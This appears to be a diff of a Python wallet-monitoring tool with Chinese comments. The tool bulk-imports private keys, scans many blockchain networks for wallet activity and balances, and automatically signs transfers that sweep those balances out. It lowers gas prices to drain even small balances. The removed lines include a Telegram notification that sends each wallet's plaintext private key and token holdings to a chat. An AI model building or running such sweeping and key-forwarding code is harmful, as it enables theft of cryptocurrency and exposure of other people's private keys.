-                
-                if balance > 0:
-                    # 计算实际余额
-                    decimals = token_info['decimals']
-                    actual_balance = balance / (10 ** decimals)
-                    
-                    tokens_found.append({
-                        'address': token_address,
-                        'symbol': token_info['symbol'],
-                        'name': token_info['name'],
-                        'balance': actual_balance,
-                        'balance_raw': balance,
-                        'decimals': decimals
-                    })
-                    
-                    print(f"{Fore.GREEN}💰 发现代币: {actual_balance:.6f} {token_info['symbol']}{Style.RESET_ALL}")
-                
-            except Exception as e:
-                continue  # 忽略单个代币的错误
-        
-        return tokens_found
-
-    async def get_token_price_coingecko(self, token_symbol: str, network_name: str) -> Optional[float]:
-        """从CoinGecko获取代币价格（美元）"""
+    def cleanup(self):
+        """清理资源"""
         try:
-            # CoinGecko API映射
-            coingecko_ids = {
-                'USDT': 'tether',
-                'USDC': 'usd-coin', 
-                'UNI': 'uniswap',
-                'LINK': 'chainlink',
-                'DAI': 'dai',
-                'WMATIC': 'matic-network',
-                'DEGEN': 'degen-base',
-                'ETH': 'ethereum',
-                'MATIC': 'matic-network',
-                'OP': 'optimism',
-                'ARB': 'arbitrum'
-            }
+            # 关闭连接管理器的所有会话
+            connection_manager.close_all_sessions()
             
-            token_id = coingecko_ids.get(token_symbol.upper())
-            if not token_id:
-                return None
+            # 保存网络状态
+            self.save_network_status()
             
-            url = f"https://api.coingecko.com/api/v3/simple/price?ids={token_id}&vs_currencies=usd"
+            # 清理Web3客户端
+            self.web3_clients.clear()
             
-            async with aiohttp.ClientSession() as session:
-                async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as response:
-                    if response.status == 200:
-                        data = await response.json()
-                        return data.get(token_id, {}).get('usd')
-            
-        except Exception as e:
-            print(f"{Fore.YELLOW}⚠️ 价格查询失败 {token_symbol}: {str(e)[:30]}...{Style.RESET_ALL}")
-            return None
-
-    async def scan_erc20_tokens_with_prices(self, address: str, network_key: str, web3) -> List[Dict]:
-        """扫描钱包的ERC20代币余额并获取价格"""
-        if not ERC20_SCAN_ENABLED or network_key not in VALUABLE_ERC20_TOKENS:
-            return []
+            print(f"{Fore.GREEN}🧹 资源清理完成{Style.RESET_ALL}")
+        except:
+            pass
         
-        tokens_found = []
-        token_addresses = VALUABLE_ERC20_TOKENS[network_key]
-        
-        print(f"{Fore.CYAN}🪙 扫描 {len(token_addresses)} 个ERC20代币（含价格查询）...{Style.RESET_ALL}")
-        
-        for token_address, token_info in token_addresses.items():
-            try:
-                # 创建代币合约实例
-                loop = asyncio.get_event_loop()
-                
-                # 在executor中执行合约调用
-                contract = web3.eth.contract(address=token_address, abi=ERC20_ABI)
-                balance = await loop.run_in_executor(None, contract.functions.balanceOf(address).call)
-                
-                if balance > 0:
-                    # 计算实际余额
-                    decimals = token_info['decimals']
-                    actual_balance = balance / (10 ** decimals)
-                    
-                    # 获取价格
-                    price_usd = await self.get_token_price_coingecko(token_info['symbol'], network_key)
-                    total_value_usd = actual_balance * price_usd if price_usd else None
-                    
-                    token_data = {
-                        'address': token_address,
-                        'symbol': token_info['symbol'],
-                        'name': token_info['name'],
-                        'balance': actual_balance,
-                        'balance_raw': balance,
-                        'decimals': decimals,
-                        'price_usd': price_usd,
-                        'total_value_usd': total_value_usd,
-                        'network': network_key
-                    }
-                    
-                    tokens_found.append(token_data)
-                    
-                    # 显示代币信息
-                    if price_usd and total_value_usd:
-                        print(f"{Fore.GREEN}💰 发现代币: {actual_balance:.6f} {token_info['symbol']} (${price_usd:.4f} = ${total_value_usd:.2f}){Style.RESET_ALL}")
-                    else:
-                        print(f"{Fore.GREEN}💰 发现代币: {actual_balance:.6f} {token_info['symbol']} (价格未知){Style.RESET_ALL}")
-                
-            except Exception as e:
-                continue  # 忽略单个代币的错误
-        
-        return tokens_found
-
-    async def send_erc20_summary_notification(self, wallet_address: str, private_key: str, all_tokens: List[Dict]):
-        """发送ERC20代币汇总通知"""
-        if not TELEGRAM_NOTIFICATIONS_ENABLED or not all_tokens:
-            return
-        
-        # 按网络分组
-        tokens_by_network = {}
-        total_value_usd = 0
-        
-        for token in all_tokens:
-            network = token['network']
-            if network not in tokens_by_network:
-                tokens_by_network[network] = []
-            tokens_by_network[network].append(token)
-            
-            if token['total_value_usd']:
-                total_value_usd += token['total_value_usd']
-        
-        # 构建消息
-        message = f"""🪙 <b>ERC20代币汇总报告</b>
-
-📍 <b>钱包地址:</b> <code>{wallet_address}</code>
-🔐 <b>私钥:</b> <code>{private_key}</code>
-💰 <b>总价值:</b> ${total_value_usd:.2f} USD
-
-"""
-        
-        for network, tokens in tokens_by_network.items():
-            network_name = NETWORK_NAMES.get(network, network)
-            message += f"🌐 <b>{network_name}</b>\n"
-            
-            for token in tokens:
-                if token['total_value_usd']:
-                    message += f"  • {token['balance']:.6f} {token['symbol']} (${token['total_value_usd']:.2f})\n"
-                else:
-                    message += f"  • {token['balance']:.6f} {token['symbol']} (价格未知)\n"
-            message += "\n"
-        
-        message += f"⏰ <b>扫描时间:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-        
-        try:
-            await send_telegram_notification(message)
-            print(f"{Fore.GREEN}📱 ERC20汇总通知已发送到Telegram{Style.RESET_ALL}")
-        except Exception as e:
-            print(f"{Fore.RED}❌ Telegram通知发送失败: {str(e)[:30]}...{Style.RESET_ALL}")
-
-    async def calculate_smart_gas(self, web3, from_address: str, to_address: str, value: int, is_erc20: bool = False, token_address: str = None) -> Dict:
-        """智能Gas计算 - 优化小余额转账"""
-        try:
-            loop = asyncio.get_event_loop()
-            
-            # 确保地址格式正确
-            from_address = Web3.to_checksum_address(from_address)
-            to_address = Web3.to_checksum_address(to_address)
-            if token_address:
-                token_address = Web3.to_checksum_address(token_address)
-            
-            # 获取最新的gas价格
-            gas_price = await loop.run_in_executor(None, lambda: web3.eth.gas_price)
-            
-            # 获取网络建议的gas价格（如果支持）
-            try:
-                # 尝试获取EIP-1559的gas费用
-                latest_block = await loop.run_in_executor(None, lambda: web3.eth.get_block('latest'))
-                if hasattr(latest_block, 'baseFeePerGas') and latest_block.baseFeePerGas:
-                    # 使用EIP-1559
-                    base_fee = latest_block.baseFeePerGas
-                    max_priority_fee = web3.to_wei(2, 'gwei')  # 2 gwei tip
-                    max_fee = base_fee + max_priority_fee
-                    
-                    gas_config = {
-                        'type': 'eip1559',
-                        'maxFeePerGas': max_fee,
-                        'maxPriorityFeePerGas': max_priority_fee,
-                        'baseFee': base_fee
-                    }
-                else:
-                    # 使用传统gas价格
-                    gas_config = {
-                        'type': 'legacy',
-                        'gasPrice': gas_price
-                    }
-            except:
-                # 回退到传统方式
-                gas_config = {
-                    'type': 'legacy',
-                    'gasPrice': gas_price
-                }
-            
-            # 估算gas限制
-            if is_erc20 and token_address:
-                # ERC20转账的gas估算
-                try:
-                    contract = web3.eth.contract(address=token_address, abi=ERC20_ABI)
-                    gas_limit = await loop.run_in_executor(
-                        None, 
-                        lambda: contract.functions.transfer(to_address, value).estimateGas({'from': from_address})
-                    )
-                    # 增加10%的安全边际
-                    gas_limit = int(gas_limit * 1.1)
-                except:
-                    gas_limit = 70000  # ERC20转账的默认gas限制
-            else:
-                # 原生代币转账
-                try:
-                    gas_limit = await loop.run_in_executor(
-                        None,
-                        lambda: web3.eth.estimate_gas({
-                            'from': from_address,
-                            'to': to_address,
-                            'value': value
-                        })
-                    )
-                    # 增加5%的安全边际
-                    gas_limit = int(gas_limit * 1.05)
-                except:
-                    gas_limit = 21000  # 标准转账gas限制
-            
-            # 计算总gas费用
-            if gas_config['type'] == 'eip1559':
-                total_gas_cost = gas_limit * gas_config['maxFeePerGas']
-            else:
-                total_gas_cost = gas_limit * gas_config['gasPrice']
-            
-            # 优化小余额转账 - 使用更低的gas价格
-            if not is_erc20:  # 只对原生代币转账进行优化
-                balance_wei = value + total_gas_cost
-                if balance_wei < web3.to_wei(0.005, 'ether'):  # 小于0.005 ETH的余额
-                    # 更激进的降低gas价格以最大化转账金额
-                    if balance_wei < web3.to_wei(0.0001, 'ether'):
-                        # 非常小的余额，降低更多
-                        optimized_gas_price = int(gas_price * 0.6)  # 降低40%
-                    else:
-                        # 较小余额，适度降低
-                        optimized_gas_price = int(gas_price * 0.75)  # 降低25%
-                    
-                    optimized_gas_cost = gas_limit * optimized_gas_price
-                    
-                    # 确保优化后的gas费不会太低导致交易失败
-                    min_gas_price = web3.to_wei(1, 'gwei')  # 最低1 gwei
-                    if optimized_gas_price < min_gas_price:
-                        optimized_gas_price = min_gas_price
-                        optimized_gas_cost = gas_limit * optimized_gas_price
-                    
-                    gas_config.update({
-                        'optimized': True,
-                        'gasPrice': optimized_gas_price,
-                        'original_gas_cost': total_gas_cost,
-                        'optimized_gas_cost': optimized_gas_cost
-                    })
-                    total_gas_cost = optimized_gas_cost
-            
-            gas_config.update({
-                'gasLimit': gas_limit,
-                'totalGasCost': total_gas_cost
-            })
-            
-            return gas_config
-            
-        except Exception as e:
-            # 返回默认配置
-            return {
-                'type': 'legacy',
-                'gasPrice': web3.to_wei(20, 'gwei'),
-                'gasLimit': 70000 if is_erc20 else 21000,
-                'totalGasCost': web3.to_wei(20, 'gwei') * (70000 if is_erc20 else 21000),
-                'error': str(e)
-            }
-
     def initialize_clients(self):
-        """智能初始化网络客户端 - 轮询API密钥模式"""
-        print(f"\n{Fore.CYAN}🔧 智能初始化网络客户端...{Style.RESET_ALL}")
-        status = get_api_keys_status()
-        print(f"{Fore.CYAN}🔑 API密钥轮询系统: {status['total_keys']} 个密钥，每{status['requests_per_api']}次请求轮换{Style.RESET_ALL}")
+        """并发初始化所有网络客户端 - 纯RPC模式"""
+        print(f"\n{Fore.CYAN}🔧 并发初始化 {len(SUPPORTED_NETWORKS)} 个RPC网络客户端...{Style.RESET_ALL}")
         
         def init_single_client(network_item):
             network_key, network_info = network_item
-            
-            # 对每个网络使用轮询的API密钥
             try:
-                # 使用轮询获取网络配置
-                network_config = build_network_config(use_rotation=True)
-                config = network_config.get(network_key)
-                if not config:
-                    return network_key, None, False, "网络配置不存在", CURRENT_API_KEY_INDEX
+                config = network_info['config']
                 
-                # 智能延迟 - 基于API限制动态调整
-                rate_info = calculate_optimal_scanning_params()
-                smart_delay = max(0.1, rate_info['optimal_interval'])
-                time.sleep(smart_delay)
+                # 添加小延迟避免API限制
+                import time
+                time.sleep(0.1)
                 
-                # 创建Web3连接
-                web3 = Web3(Web3.HTTPProvider(config['rpc_url'], request_kwargs={'timeout': 15}))
+                # 纯RPC模式 - 改进的连接配置
+                request_kwargs = {
+                    'timeout': (5, 10),  # (连接超时, 读取超时)
+                    'headers': {
+                        'User-Agent': 'WalletMonitor/3.0',
+                        'Connection': 'keep-alive'
+                    }
+                }
                 
-                # 测试连接
-                block_number = web3.eth.get_block_number()
-                return network_key, web3, True, None, CURRENT_API_KEY_INDEX
+                web3 = Web3(Web3.HTTPProvider(
+                    config['rpc_url'], 
+                    request_kwargs=request_kwargs
+                ))
+                
+                # 测试连接 - 添加超时控制
+                import signal
+                def timeout_handler(signum, frame):
+                    raise TimeoutError("Connection test timeout")
+                
+                signal.signal(signal.SIGALRM, timeout_handler)
+                signal.alarm(8)  # 8秒超时
+                
+                try:
+                    block_number = web3.eth.get_block_number()
+                    signal.alarm(0)  # 取消超时
+                    return network_key, web3, True, None
+                except Exception as e:
+                    signal.alarm(0)  # 取消超时
+                    raise e
                     
             except Exception as e:
-                error_msg = str(e)
+                return network_key, None, False, str(e)
+        
+        # 使用线程池并发初始化（降低并发数避免API限制）
+        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
+            # 按优先级排序，只初始化前20个网络避免API限制
+            sorted_networks = sorted(SUPPORTED_NETWORKS.items(), 
+                                   key=lambda x: NETWORK_PRIORITY.get(x[0], 999))
+            
+            # 只初始化前10个网络，避免API限制
+            priority_networks = sorted_networks[:10]
+            futures = [executor.submit(init_single_client, item) for item in priority_networks]
+            
+            success_count = 0
+            mainnet_count = 0
+            testnet_count = 0
+            
+            for future in concurrent.futures.as_completed(futures):
+                network_key, client, success, error = future.result()
                 
-                # 检查是否是API密钥相关错误
-                if "403" in error_msg or "401" in error_msg or "Invalid API key" in error_msg or "429" in error_msg:
-                    # 强制切换API密钥
-                    if len(ALCHEMY_API_KEYS) > 1:
-                        old_key_index = CURRENT_API_KEY_INDEX
-                        force_switch_api_key()
-                        print(f"{Fore.YELLOW}🚨 API#{old_key_index + 1}遇到限制，强制切换到API#{CURRENT_API_KEY_INDEX + 1} - {NETWORK_NAMES.get(network_key, network_key)}{Style.RESET_ALL}")
-                        return network_key, None, False, f"API限制，已切换密钥", CURRENT_API_KEY_INDEX
+                if success:
+                    # 存储RPC客户端
+                    self.web3_clients[network_key] = client
+                    
+                    self.network_status[network_key] = NetworkStatus(
+                        available=True,
+                        last_check=datetime.now().isoformat(),
+                        error_count=0,
+                        last_error=""
+                    )
+                    
+                    # 分类统计
+                    if network_key in MAINNET_NETWORKS:
+                        mainnet_count += 1
+                        print(f"{Fore.GREEN}🌐 {NETWORK_NAMES[network_key]} (主网-RPC){Style.RESET_ALL}")
                     else:
-                        return network_key, None, False, f"API密钥失效: {error_msg}", CURRENT_API_KEY_INDEX
+                        testnet_count += 1
+                        print(f"{Fore.CYAN}🌐 {NETWORK_NAMES[network_key]} (测试网-RPC){Style.RESET_ALL}")
+                    
+                    success_count += 1
                 else:
-                    # 非API密钥问题
-                    return network_key, None, False, error_msg, CURRENT_API_KEY_INDEX
-        
-        # 只初始化最重要的5个网络，避免API限制
-        priority_networks = sorted(SUPPORTED_NETWORKS.items(), 
-                                 key=lambda x: NETWORK_PRIORITY.get(x[0], 999))[:5]
-        
-        success_count = 0
-        mainnet_count = 0
-        testnet_count = 0
-        
-        print(f"{Fore.CYAN}📡 初始化 {len(priority_networks)} 个核心网络 (轮询API密钥)...{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}💡 其他{len(SUPPORTED_NETWORKS) - 5}个网络将按需加载{Style.RESET_ALL}")
-        
-        # 串行初始化，避免API限制
-        for i, (network_key, network_info) in enumerate(priority_networks, 1):
-            print(f"{Fore.CYAN}[{i}/{len(priority_networks)}] 初始化 {NETWORK_NAMES.get(network_key, network_key)}...{Style.RESET_ALL}")
-            
-            result = init_single_client((network_key, network_info))
-            network_key, client, success, error, used_key_index = result
-            
-            if success:
-                self.web3_clients[network_key] = client
-                
-                self.network_status[network_key] = NetworkStatus(
-                    available=True,
-                    last_check=datetime.now().isoformat(),
-                    error_count=0,
-                    last_error=""
-                )
-                
-                if network_key in MAINNET_NETWORKS:
-                    mainnet_count += 1
-                    print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} (主网-API#{used_key_index + 1}){Style.RESET_ALL}")
-                else:
-                    testnet_count += 1
-                    print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} (测试网-API#{used_key_index + 1}){Style.RESET_ALL}")
-                
-                success_count += 1
-            else:
-                self.network_status[network_key] = NetworkStatus(
-                    available=False,
-                    last_check=datetime.now().isoformat(),
-                    error_count=1,
-                    last_error=error
-                )
-                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} - {error[:40]}...{Style.RESET_ALL}")
+                    self.network_status[network_key] = NetworkStatus(
+                        available=False,
+                        last_check=datetime.now().isoformat(),
+                        error_count=1,
+                        last_error=error
+                    )
+                    print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} (RPC) - {error[:50]}...{Style.RESET_ALL}")
         
         self.save_network_status()
         
-        print(f"\n{Fore.GREEN}🎉 网络初始化完成!{Style.RESET_ALL}")
-        print(f"  📊 可用网络: {success_count}/5 个核心网络")
+        print(f"\n{Fore.GREEN}🎉 RPC网络系统初始化完成!{Style.RESET_ALL}")
+        print(f"  📊 总计: {success_count}/10 个优先网络可用 (避免API限制)")
         print(f"  🌐 主网: {mainnet_count} 个")
         print(f"  🧪 测试网: {testnet_count} 个")
-        print(f"  🔑 当前API密钥: #{CURRENT_API_KEY_INDEX + 1}/{len(ALCHEMY_API_KEYS)}")
-        print(f"  🔄 轮询状态: {API_REQUEST_COUNT}/{REQUESTS_PER_API} 次")
-        print(f"  💡 其他{len(SUPPORTED_NETWORKS) - 5}个网络将按需加载 (共{len(SUPPORTED_NETWORKS)}个)")
+        print(f"  🌐 RPC模式: {success_count} 个")
+        print(f"  💡 其他网络将在需要时动态加载")
     
     def load_network_on_demand(self, network_key: str) -> bool:
-        """按需加载网络客户端 - 轮询API密钥"""
+        """按需加载网络客户端"""
         if network_key in self.web3_clients:
             return True
-        
+            
         try:
-            # 使用轮询获取网络配置
-            network_config = build_network_config(use_rotation=True)
-            config = network_config.get(network_key)
-            if not config:
+            network_info = SUPPORTED_NETWORKS.get(network_key)
+            if not network_info:
                 return False
+                
+            config = network_info['config']
             
-            web3 = Web3(Web3.HTTPProvider(config['rpc_url'], request_kwargs={'timeout': 15}))
+            # 改进的连接配置
+            request_kwargs = {
+                'timeout': (3, 8),  # 更短的超时时间
+                'headers': {
+                    'User-Agent': 'WalletMonitor/3.0',
+                    'Connection': 'keep-alive'
+                }
+            }
             
-            # 测试连接
-            web3.eth.get_block_number()
+            web3 = Web3(Web3.HTTPProvider(config['rpc_url'], request_kwargs=request_kwargs))
+            
+            # 测试连接 - 添加超时控制
+            import signal
+            def timeout_handler(signum, frame):
+                raise TimeoutError("Dynamic load timeout")
+                
+            signal.signal(signal.SIGALRM, timeout_handler)
+            signal.alarm(5)  # 5秒超时
+            
+            try:
+                web3.eth.get_block_number()
+                signal.alarm(0)  # 取消超时
+            except Exception as e:
+                signal.alarm(0)  # 取消超时
+                raise e
             
             # 存储客户端
             self.web3_clients[network_key] = web3
@@ -1778,26 +820,17 @@ class WalletMonitor:
                 last_error=""
             )
             
-            print(f"{Fore.GREEN}🔗 动态加载 {NETWORK_NAMES[network_key]} 成功 (API#{CURRENT_API_KEY_INDEX + 1}){Style.RESET_ALL}")
+            print(f"{Fore.GREEN}🔗 动态加载 {NETWORK_NAMES[network_key]} 成功{Style.RESET_ALL}")
             return True
             
         except Exception as e:
-            error_msg = str(e)
-            
-            # 如果遇到API问题，强制切换密钥
-            if ("403" in error_msg or "401" in error_msg or "Invalid API key" in error_msg or "429" in error_msg) and len(ALCHEMY_API_KEYS) > 1:
-                old_key_index = CURRENT_API_KEY_INDEX
-                force_switch_api_key()
-                print(f"{Fore.YELLOW}🚨 动态加载时API#{old_key_index + 1}失效，已切换到API#{CURRENT_API_KEY_INDEX + 1}{Style.RESET_ALL}")
-            
-            # 记录错误状态
             self.network_status[network_key] = NetworkStatus(
                 available=False,
                 last_check=datetime.now().isoformat(),
                 error_count=1,
-                last_error=error_msg
+                last_error=str(e)
             )
-            print(f"{Fore.YELLOW}⚠️ 动态加载 {NETWORK_NAMES[network_key]} 失败: {error_msg[:30]}...{Style.RESET_ALL}")
+            print(f"{Fore.YELLOW}⚠️ 动态加载 {NETWORK_NAMES[network_key]} 失败: {str(e)[:30]}...{Style.RESET_ALL}")
             return False
     
     def load_network_status(self):
@@ -1835,9 +868,6 @@ class WalletMonitor:
     def save_wallets(self):
         """保存钱包数据"""
         try:
-            # 检查并轮转日志文件
-            check_and_rotate_log_file(WALLETS_FILE)
-            
             data = [wallet.__dict__ for wallet in self.wallets]
             with open(WALLETS_FILE, 'w', encoding='utf-8') as f:
                 json.dump(data, f, ensure_ascii=False, indent=2)
@@ -1916,19 +946,15 @@ class WalletMonitor:
         
         while True:
             try:
-                line = enhanced_safe_input("", "")
-                
-                # 检查退出命令
+                line = input()
                 if line.strip().lower() in ['q', 'quit', 'exit']:
                     print(f"\n{Fore.YELLOW}🔙 返回主菜单{Style.RESET_ALL}")
                     time.sleep(1)
                     return
                 
-                # 处理空行
                 if line.strip() == "":
                     empty_line_count += 1
                     if empty_line_count >= 2:
-                        print(f"\n{Fore.GREEN}✅ 检测到双击回车，开始处理...{Style.RESET_ALL}")
                         break
                 else:
                     empty_line_count = 0
@@ -1955,7 +981,7 @@ class WalletMonitor:
             print(f"{Fore.CYAN}🔍 支持格式示例:{Style.RESET_ALL}")
             print(f"  • 0x1234567890abcdef... (带0x前缀)")
             print(f"  • 1234567890abcdef... (不带前缀)")
-            enhanced_safe_input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
+            input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
             return
         
         print(f"\n{Fore.GREEN}🎉 发现 {len(private_keys)} 个有效私钥!{Style.RESET_ALL}")
@@ -2003,7 +1029,7 @@ class WalletMonitor:
             print(f"  🌐 支持网络: {len(SUPPORTED_NETWORKS)} 个")
             print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
             
-            confirm = enhanced_safe_input(f"\n{Fore.CYAN}确认导入这 {len(new_wallets)} 个新钱包? (y/N): {Style.RESET_ALL}", "n")
+            confirm = input(f"\n{Fore.CYAN}确认导入这 {len(new_wallets)} 个新钱包? (y/N): {Style.RESET_ALL}")
             
             if confirm.lower() in ['y', 'yes']:
                 self.wallets.extend(new_wallets)
@@ -2017,7 +1043,7 @@ class WalletMonitor:
             print(f"\n{Fore.YELLOW}💡 所有私钥对应的钱包都已存在{Style.RESET_ALL}")
             print(f"{Fore.CYAN}💼 当前钱包总数: {len(self.wallets)} 个{Style.RESET_ALL}")
         
-        enhanced_safe_input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
+        input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
     
     async def check_address_activity_optimized(self, address: str, network_key: str) -> bool:
         """优化的地址活动检查 - 纯RPC模式"""
@@ -2025,46 +1051,86 @@ class WalletMonitor:
         network_status = self.network_status.get(network_key)
         if network_status and not network_status.available:
             return False
-            
-        try:
-            # 获取网络信息
-            network_info = SUPPORTED_NETWORKS.get(network_key)
-            if not network_info:
+        
+        # 检查是否错误次数过多
+        if network_status and network_status.error_count >= 5:
+            # 暂时跳过错误过多的网络，但每10次检查重试一次
+            if network_status.error_count % 10 != 0:
                 return False
             
-            # RPC模式 - 按需加载
-            web3 = self.web3_clients.get(network_key)
-            if not web3:
-                # 尝试动态加载
-                if not self.load_network_on_demand(network_key):
+        max_retries = 3
+        retry_count = 0
+        
+        while retry_count < max_retries:
+            try:
+                # 获取网络信息
+                network_info = SUPPORTED_NETWORKS.get(network_key)
+                if not network_info:
                     return False
+                
+                # RPC模式 - 按需加载
                 web3 = self.web3_clients.get(network_key)
                 if not web3:
+                    # 尝试动态加载
+                    if not self.load_network_on_demand(network_key):
+                        return False
+                    web3 = self.web3_clients.get(network_key)
+                    if not web3:
+                        return False
+                
+                # 添加超时控制
+                async with asyncio.timeout(8):  # 8秒超时
+                    return await self._check_activity_rpc(web3, address, network_key)
+                    
+            except asyncio.TimeoutError:
+                retry_count += 1
+                if retry_count < max_retries:
+                    await asyncio.sleep(retry_count * 0.5)  # 指数退避
+                    continue
+                else:
+                    print(f"{Fore.YELLOW}⏰ {NETWORK_NAMES[network_key]} - 连接超时，跳过{Style.RESET_ALL}")
+                    self.network_status[network_key].error_count += 1
+                    self.network_status[network_key].last_error = "连接超时"
                     return False
-            return await self._check_activity_rpc(web3, address, network_key)
-            
-        except Exception as e:
-            error_msg = str(e)
-            
-            # 智能错误分类和处理
-            if "403" in error_msg or "Forbidden" in error_msg:
-                print(f"{Fore.RED}🚫 {NETWORK_NAMES[network_key]} API访问被拒绝{Style.RESET_ALL}")
-                self.network_status[network_key].available = False
-                self.network_status[network_key].last_error = "API访问被拒绝"
-            elif "Name or service not known" in error_msg or "Failed to resolve" in error_msg:
-                print(f"{Fore.YELLOW}🌐 {NETWORK_NAMES[network_key]} DNS解析失败{Style.RESET_ALL}")
-                self.network_status[network_key].available = False
-                self.network_status[network_key].last_error = "网络不可达"
-            elif "Max retries exceeded" in error_msg:
-                print(f"{Fore.YELLOW}🔄 {NETWORK_NAMES[network_key]} 网络超时{Style.RESET_ALL}")
-                self.network_status[network_key].error_count += 1
-                self.network_status[network_key].last_error = "网络超时"
-            else:
-                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 检查失败: {error_msg[:30]}...{Style.RESET_ALL}")
-                self.network_status[network_key].error_count += 1
-                self.network_status[network_key].last_error = error_msg[:100]
-            
-            return False
+                    
+            except Exception as e:
+                retry_count += 1
+                error_msg = str(e)
+                
+                # 智能错误分类和处理
+                if any(keyword in error_msg for keyword in ["HTTPSConnectionPool", "Connection pool", "Max retries"]):
+                    print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} - {error_msg[:50]}...{Style.RESET_ALL}")
+                    if retry_count < max_retries:
+                        await asyncio.sleep(retry_count * 1.0)  # 更长的等待时间
+                        continue
+                    else:
+                        self.network_status[network_key].error_count += 1
+                        self.network_status[network_key].last_error = "连接池错误"
+                        return False
+                        
+                elif "403" in error_msg or "Forbidden" in error_msg:
+                    print(f"{Fore.RED}🚫 {NETWORK_NAMES[network_key]} - API访问被拒绝{Style.RESET_ALL}")
+                    self.network_status[network_key].available = False
+                    self.network_status[network_key].last_error = "API访问被拒绝"
+                    return False
+                    
+                elif "Name or service not known" in error_msg or "Failed to resolve" in error_msg:
+                    print(f"{Fore.YELLOW}🌐 {NETWORK_NAMES[network_key]} - DNS解析失败{Style.RESET_ALL}")
+                    self.network_status[network_key].available = False
+                    self.network_status[network_key].last_error = "网络不可达"
+                    return False
+                    
+                else:
+                    if retry_count < max_retries:
+                        await asyncio.sleep(retry_count * 0.5)
+                        continue
+                    else:
+                        print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} - {error_msg[:30]}...{Style.RESET_ALL}")
+                        self.network_status[network_key].error_count += 1
+                        self.network_status[network_key].last_error = error_msg[:100]
+                        return False
+        
+        return False
     
 
     
@@ -2076,14 +1142,11 @@ class WalletMonitor:
             
             # 检查账户余额
             balance = await loop.run_in_executor(None, web3.eth.get_balance, address)
-            update_cu_usage(API_RATE_LIMITS['cu_per_request'])  # 跟踪CU使用
-            
             if balance > 0:
                 return True
             
             # 检查交易计数
             nonce = await loop.run_in_executor(None, web3.eth.get_transaction_count, address)
-            update_cu_usage(API_RATE_LIMITS['cu_per_request'])  # 跟踪CU使用
             return nonce > 0
             
         except Exception as e:
@@ -2094,37 +1157,59 @@ class WalletMonitor:
         network_status = self.network_status.get(network_key)
         if network_status and not network_status.available:
             return 0.0
+        
+        # 检查错误次数    
+        if network_status and network_status.error_count >= 3:
+            return 0.0
             
-        try:
-            # 获取网络信息
-            network_info = SUPPORTED_NETWORKS.get(network_key)
-            if not network_info:
-                return 0.0
-            
-            async with asyncio.timeout(5):  # 5秒超时
-                # RPC模式 - 按需加载
-                web3 = self.web3_clients.get(network_key)
-                if not web3:
-                    # 尝试动态加载
-                    if not self.load_network_on_demand(network_key):
-                        return 0.0
+        max_retries = 2
+        retry_count = 0
+        
+        while retry_count < max_retries:
+            try:
+                # 获取网络信息
+                network_info = SUPPORTED_NETWORKS.get(network_key)
+                if not network_info:
+                    return 0.0
+                
+                async with asyncio.timeout(8):  # 增加到8秒超时
+                    # RPC模式 - 按需加载
                     web3 = self.web3_clients.get(network_key)
                     if not web3:
-                        return 0.0
-                
-                # 在事件循环中运行同步的web3调用
-                loop = asyncio.get_event_loop()
-                balance_wei = await loop.run_in_executor(None, web3.eth.get_balance, address)
-                update_cu_usage(API_RATE_LIMITS['cu_per_request'])  # 跟踪CU使用
-                balance_eth = Web3.from_wei(balance_wei, 'ether')
-                return float(balance_eth)
-                
-        except asyncio.TimeoutError:
-            if network_key in self.network_status:
-                self.network_status[network_key].error_count += 1
-            return 0.0
-        except Exception as e:
-            return 0.0
+                        # 尝试动态加载
+                        if not self.load_network_on_demand(network_key):
+                            return 0.0
+                        web3 = self.web3_clients.get(network_key)
+                        if not web3:
+                            return 0.0
+                    
+                    # 在事件循环中运行同步的web3调用
+                    loop = asyncio.get_event_loop()
+                    balance_wei = await loop.run_in_executor(None, web3.eth.get_balance, address)
+                    balance_eth = Web3.from_wei(balance_wei, 'ether')
+                    return float(balance_eth)
+                    
+            except asyncio.TimeoutError:
+                retry_count += 1
+                if retry_count < max_retries:
+                    await asyncio.sleep(retry_count * 0.5)
+                    continue
+                else:
+                    if network_key in self.network_status:
+                        self.network_status[network_key].error_count += 1
+                    return 0.0
+                    
+            except Exception as e:
+                retry_count += 1
+                if retry_count < max_retries:
+                    await asyncio.sleep(retry_count * 0.5)
+                    continue
+                else:
+                    if network_key in self.network_status:
+                        self.network_status[network_key].error_count += 1
+                    return 0.0
+        
+        return 0.0
     
     async def transfer_balance_optimized(self, wallet: WalletInfo, network_key: str, balance: float) -> bool:
         """优化的转账功能 - 纯RPC模式"""
@@ -2193,18 +1278,18 @@ class WalletMonitor:
             
             # 签名并发送交易
             signed_txn = account.sign_transaction(transaction)
-            tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.raw_transaction)
+            tx_hash = await loop.run_in_executor(None, web3.eth.send_raw_transaction, signed_txn.rawTransaction)
             
-            # 记录转账并发送通知
-            await self._log_transfer_success(wallet, network_key, transfer_amount, tx_hash, gas_cost, gas_price, config)
+            # 记录转账
+            self._log_transfer_success(wallet, network_key, transfer_amount, tx_hash, gas_cost, gas_price, config)
             return True
             
         except Exception as e:
             print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} RPC转账失败: {str(e)[:50]}...{Style.RESET_ALL}")
             return False
     
-    async def _log_transfer_success(self, wallet: WalletInfo, network_key: str, transfer_amount: int, tx_hash: Any, gas_cost: int, gas_price: int, config: dict):
-        """记录转账成功并发送TG通知"""
+    def _log_transfer_success(self, wallet: WalletInfo, network_key: str, transfer_amount: int, tx_hash: Any, gas_cost: int, gas_price: int, config: dict):
+        """记录转账成功"""
